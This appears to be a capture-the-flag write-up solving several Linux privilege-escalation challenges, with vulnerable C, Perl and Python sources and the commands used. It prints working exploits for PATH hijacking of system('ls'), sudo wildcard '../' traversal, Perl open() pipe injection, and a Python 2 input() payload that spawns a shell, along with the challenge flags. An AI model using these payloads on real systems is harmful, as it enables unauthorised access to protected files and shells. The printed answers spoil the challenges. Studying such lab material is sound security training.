# Bash - System 1
Source 
```C
#include <stdlib.h>
#include <stdio.h>
 
/* gcc -m32 -o ch11 ch11.c */
 
int main(void) 
{
	system("ls /challenge/app-script/ch11/.passwd"); 
	return 0;
}
```
Solve
```assembly
app-script-ch11@challenge02:~$ mkdir /tmp/tmp1/ ; cd /tmp/tmp1
app-script-ch11@challenge02:/tmp/tmp1$ export PATH="/tmp/tmp1:${PATH}"
app-script-ch11@challenge02:/tmp/tmp1$ ln -s /bin/cat ls
app-script-ch11@challenge02:/tmp/tmp1$ ~/ch11
!oPe96a/.s8d5
```

Flag is : ```!oPe96a/.s8d5```

# sudo - weak configuration

by using the command : `sudo -l` We can see our rights in the sudo world. And as the command says :
```assembly
app-script-ch1@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
```
’*’ being a good soldier, it can be replaced by everything... even ’../’
So, to get the file /shell1cracked/.flag we can use :
```assembly
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked  cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
b3_c4r3full_w1th_sud0
```
Flag is : ```b3_c4r3full_w1th_sud0```

# Bash - System 2
Source:

```C
#include <stdlib.h>
#include <stdio.h>
 
int main(){
	system("ls -lA /challenge/app-script/ch12/.passwd");
	return 0;
}
```
Solve 0x1:
```assembly
app-script-ch12@challenge02:~$ mkdir /tmp/pwnd
app-script-ch12@challenge02:~$ cp /bin/nano /tmp/pwnd/ls
app-script-ch12@challenge02:~$ export PATH=/tmp/pwnd:$PATH
app-script-ch12@challenge02:~$ ./ch12
```
Solve 0x2:
```assembly
app-script-ch12@challenge02:~$ mkdir /tmp/pwnd1 ; cd /tmp/pwnd1
app-script-ch12@challenge02:/tmp/pwnd1$ nano pwn.c
app-script-ch12@challenge02:/tmp/pwnd1$ g++ pwn.c -o pwn
app-script-ch12@challenge02:/tmp/pwnd1$ export PATH=/tmp/pwnd1:$PATH
app-script-ch12@challenge02:/tmp/pwnd1$ mv pwn ls
app-script-ch12@challenge02:/tmp/pwnd1$ ~/ch12 
8a95eDS/*e_T#
```
Flag is : ```8a95eDS/*e_T#```

# Perl - Command injection
Source :

```perl
#!/usr/bin/perl

delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};
$ENV{'PATH'}='/bin:/usr/bin';

use strict;
use warnings;

main();

sub main {
    my ($file, $line) = @_;

    menu();
    prompt();

    while((my $file = <STDIN>)) {
        chomp $file;

        process_file($file);

        prompt();
    }
}

sub prompt {
    local $| = 1;
    print ">>> ";
}
sub menu {
    print "*************************\n";
    print "* Stat File Service    *\n";
    print "*************************\n";
}

sub check_read_access {
    my $f = shift;

    if(-f $f) {
        my $filemode = (stat($f))[2];

        return ($filemode & 4);
    }

    return 0;
}

sub process_file {
    my $file = shift;
    my $line;
    my ($line_count, $char_count, $word_count) = (0,0,0);

    $file =~ /(.+)/;
    $file = $1;
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }


    while(($line = <F>)) {
        $line_count++;
        $char_count += length $line;
        $word_count += scalar(split/\W+/, $line);
    }

    print "~~~ Statistics for \"$file\" ~~~\n";
    print "Lines: $line_count\n";
    print "Words: $word_count\n";
    print "Chars: $char_count\n";

    close F;
}
```
Solve:
```assembly
app-script-ch7@challenge02:~$ ./setuid-wrapper 
*************************
* Stat File Service    *
*************************
>>> | cat .passwd
~~~ Statistics for "| cat .passwd" ~~~
Lines: 0
Words: 0
Chars: 0
PerlCanDoBetterThanYouThink
```
Flag is : ```PerlCanDoBetterThanYouThink```

Source :
```python
#!/usr/bin/python2
 
import sys
 
def youLose():
    print "Try again ;-)"
    sys.exit(1)
 
 
try:
    p = input("Please enter password : ")
except:
    youLose()
 
 
with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```
Now we know that the flag located in .passwd is just a set of numbers and if your input matched this numbers it will print ```Well done ! You can validate with this password !``` so i first tryed to buruteforce
```bash
#!/bin/bash

i=0;
while true; do
   echo 'echo '"$i"' | /challenge/app-script/ch6/setuid-wrapper'
   if [[ $(echo $i | /challenge/app-script/ch6/setuid-wrapper) =~ "Well done " ]] ; then
       echo "$i is the password";
        break;
   fi
   let i++
done

```
but it seemed like it will take forever so it exploited it.
```assembly
app-script-ch6@challenge02:~$ ./setuid-wrapper 
Please enter password : __import__("os").execl("/bin/sh","sh")
$ cat .passwd
13373439872909134298363103573901
$ 
```
Flag is ```13373439872909134298363103573901```
